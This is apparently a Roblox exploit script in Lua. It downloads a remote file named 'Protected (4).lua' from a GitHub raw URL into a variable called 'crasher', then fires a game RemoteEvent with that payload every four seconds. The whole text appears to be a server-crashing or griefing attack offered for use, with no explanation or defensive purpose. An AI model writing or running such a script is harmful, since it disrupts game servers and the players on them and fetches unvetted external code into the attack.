local crasher = game:HttpGet("https://raw.githubusercontent.com/zoiddddd/whitelist/main/Protected%20(4).lua")

while task.wait(4.0) do
print("test")    
game:GetService("ReplicatedStorage").GameEvents.RemoteEvent:FireServer("b", crasher)
end